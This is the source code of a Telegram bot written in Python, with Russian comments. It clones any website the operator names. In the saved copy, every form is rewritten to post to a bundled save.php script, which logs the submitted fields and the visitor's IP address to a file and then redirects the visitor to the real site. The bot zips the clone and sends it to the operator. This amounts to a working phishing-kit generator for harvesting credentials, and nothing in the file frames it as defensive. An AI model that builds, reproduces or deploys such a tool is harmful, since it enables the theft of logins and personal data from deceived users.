import telebot
import requests
from bs4 import BeautifulSoup
import os
import shutil
from urllib.parse import urljoin, urlparse
import zipfile
import threading
import time
import json
from flask import Flask, request

# ========== КОНФИГ ==========
import os
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
ALLOWED_USERS = [ADMIN_ID]
ACTIVE_TASKS = {}

bot = telebot.TeleBot(BOT_TOKEN)

# ========== ВЕБ-СЕРВЕР ДЛЯ RAILWAY ==========
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

# ========== КЛОНЕР САЙТОВ ==========
class SiteCloner:
    def __init__(self, target_url, task_id, chat_id):
        self.target_url = target_url.rstrip('/')
        self.task_id = task_id
        self.chat_id = chat_id
        self.output_dir = f"/tmp/clones/{task_id}"
        self.visited = set()
        
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(f"{self.output_dir}/css", exist_ok=True)
        os.makedirs(f"{self.output_dir}/js", exist_ok=True)
        os.makedirs(f"{self.output_dir}/images", exist_ok=True)
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def download_file(self, url, folder):
        try:
            if not url.startswith('http'):
                url = urljoin(self.target_url, url)
            
            filename = os.path.basename(urlparse(url).path) or f"file_{hash(url)%10000}"
            filepath = f"{self.output_dir}/{folder}/{filename}"
            
            resp = self.session.get(url, timeout=10)
            if resp.status_code == 200:
                with open(filepath, 'wb') as f:
                    f.write(resp.content)
                return f"{folder}/{filename}"
        except:
            return None
    
    def clone(self):
        bot.send_message(self.chat_id, f"🔄 Клонирую: {self.target_url}")
        
        try:
            response = self.session.get(self.target_url, timeout=15)
            
            if response.status_code != 200:
                bot.send_message(self.chat_id, f"❌ Ошибка: HTTP {response.status_code}")
                return None
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            bot.send_message(self.chat_id, "📥 Скачиваю CSS...")
            for tag in soup.find_all('link', href=True):
                if '.css' in tag['href']:
                    local = self.download_file(tag['href'], 'css')
                    if local:
                        tag['href'] = local
            
            bot.send_message(self.chat_id, "📥 Скачиваю JS...")
            for tag in soup.find_all('script', src=True):
                local = self.download_file(tag['src'], 'js')
                if local:
                    tag['src'] = local
            
            bot.send_message(self.chat_id, "📥 Скачиваю картинки...")
            for tag in soup.find_all('img', src=True):
                local = self.download_file(tag['src'], 'images')
                if local:
                    tag['src'] = local
            
            for form in soup.find_all('form'):
                form['action'] = 'save.php'
                form['method'] = 'POST'
            
            with open(f'{self.output_dir}/save.php', 'w') as f:
                f.write('''<?php
$data = $_POST;
$data['ip'] = $_SERVER['REMOTE_ADDR'];
$data['time'] = date('Y-m-d H:i:s');
file_put_contents('logs.txt', json_encode($data)."\\n", FILE_APPEND);
header('Location: https://' . $_SERVER['HTTP_HOST']);
?>''')
            
            with open(f'{self.output_dir}/index.html', 'w', encoding='utf-8') as f:
                f.write(str(soup))
            
            zip_path = f"/tmp/clones/{self.task_id}.zip"
            shutil.make_archive(f"/tmp/clones/{self.task_id}", 'zip', self.output_dir)
            
            return zip_path
            
        except requests.exceptions.ConnectionError:
            bot.send_message(self.chat_id, "❌ Сайт не существует или недоступен")
            return None
        except Exception as e:
            bot.send_message(self.chat_id, f"❌ Ошибка: {str(e)[:200]}")
            return None

# ========== КОМАНДЫ ==========

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id not in ALLOWED_USERS:
        bot.reply_to(message, "⛔ Доступ запрещён")
        return
    bot.reply_to(message, "🚀 Бот запущен на Railway!\n/clone URL — клонировать сайт")

@bot.message_handler(commands=['clone'])
def clone_site(message):
    if message.from_user.id not in ALLOWED_USERS:
        bot.reply_to(message, "⛔ Доступ запрещён")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Укажи URL: /clone https://site.com")
        return
    
    url = args[1]
    if not url.startswith('http'):
        url = 'https://' + url
    
    task_id = str(int(time.time()))[-8:]
    ACTIVE_TASKS[task_id] = {
        'url': url,
        'status': 'cloning',
        'chat_id': message.chat.id,
        'started': time.time()
    }
    
    bot.reply_to(message, f"🔔 Задача #{task_id}\n🎯 {url}")
    
    def process():
        cloner = SiteCloner(url, task_id, message.chat.id)
        zip_file = cloner.clone()
        
        if zip_file and os.path.exists(zip_file):
            ACTIVE_TASKS[task_id]['status'] = 'done'
            ACTIVE_TASKS[task_id]['file'] = zip_file
            size_mb = os.path.getsize(zip_file) / (1024 * 1024)
            bot.send_message(message.chat.id, f"✅ #{task_id} готов!\n📦 {size_mb:.1f} MB\n📥 /get {task_id}")
        else:
            ACTIVE_TASKS[task_id]['status'] = 'failed'
            bot.send_message(message.chat.id, f"❌ #{task_id} провалена")
    
    threading.Thread(target=process).start()

@bot.message_handler(commands=['get'])
def get_file(message):
    if message.from_user.id not in ALLOWED_USERS:
        bot.reply_to(message, "⛔ Доступ запрещён")
        return
    
    args = message.text.split()
    if len(args) < 2:
        return
    
    task_id = args[1]
    task = ACTIVE_TASKS.get(task_id)
    
    if not task or task['status'] != 'done':
        bot.reply_to(message, "❌ Нет готового файла")
        return
    
    with open(task['file'], 'rb') as f:
        bot.send_document(message.chat.id, f, visible_file_name=f"clone_{task_id}.zip")

@bot.message_handler(commands=['status'])
def status(message):
    if not ACTIVE_TASKS:
        bot.reply_to(message, "📭 Нет задач")
        return
    text = "📊 ЗАДАЧИ:\n"
    for tid, t in ACTIVE_TASKS.items():
        e = {'cloning':'⏳','done':'✅','failed':'❌'}.get(t['status'],'❓')
        text += f"{e} #{tid} — {t['url']}\n"
    bot.reply_to(message, text)

# ========== ЗАПУСК ==========
def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
